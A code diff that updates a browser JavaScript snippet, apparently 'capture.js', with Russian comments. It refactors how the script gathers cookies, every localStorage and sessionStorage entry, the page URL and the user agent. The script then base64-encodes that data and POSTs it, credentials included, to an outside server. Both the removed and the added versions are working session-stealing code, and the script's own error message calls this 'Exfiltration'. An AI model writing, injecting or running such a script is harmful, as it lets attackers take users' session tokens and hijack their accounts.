@@ -1,5 +1,5 @@
 (function () {
-  // 1. Имитация данных, если их нет
+  // Добавим имитацию данных, если ничего не установлено
   if (!localStorage.getItem("session_id")) {
     localStorage.setItem("session_id", "abc123xyz");
   }
@@ -12,41 +12,39 @@
     document.cookie = "user_id=42; path=/";
   }
 
-  // 2. Сбор данных
-  const data = {
-    cookies: document.cookie,
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage),
+  // Собираем данные
+  const payload = {
+    cookies: document.cookie || '[empty]',
+    localStorage: {},
+    sessionStorage: {},
     location: window.location.href,
     userAgent: navigator.userAgent
   };
 
-  // 3. Преобразование в Blob
-  const blob = new Blob([JSON.stringify(data, null, 2)], {
-    type: 'application/json'
-  });
+  // Преобразуем хранилища в обычные объекты
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    payload.localStorage[key] = localStorage.getItem(key);
+  }
 
-  // 4. Чтение как base64
-  const reader = new FileReader();
-  reader.onload = function () {
-    const base64File = reader.result;
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const key = sessionStorage.key(i);
+    payload.sessionStorage[key] = sessionStorage.getItem(key);
+  }
 
-    // 5. Отправка на сервер
-    fetch('https://zaza-back.onrender.com/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      credentials: 'include',
-      body: JSON.stringify({
-        email: 'from-capture.js',
-        password: 'injected',
-        dumpFile: base64File
-      })
-    }).catch(err => console.error('Exfiltration failed:', err));
-  };
+  // Преобразуем весь payload в base64
+  const jsonString = JSON.stringify(payload, null, 2);
+  const base64Payload = btoa(unescape(encodeURIComponent(jsonString))); // UTF-8-safe
 
-  reader.onerror = function () {
-    console.error("❌ Failed to read blob");
-  };
-
-  reader.readAsDataURL(blob);
+  // Отправка на сервер
+  fetch('https://zaza-back.onrender.com/login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    credentials: 'include',
+    body: JSON.stringify({
+      email: 'from-capture.js',
+      password: 'injected',
+      cookies: base64Payload
+    })
+  }).catch(err => console.error('Exfiltration failed:', err));
 })();
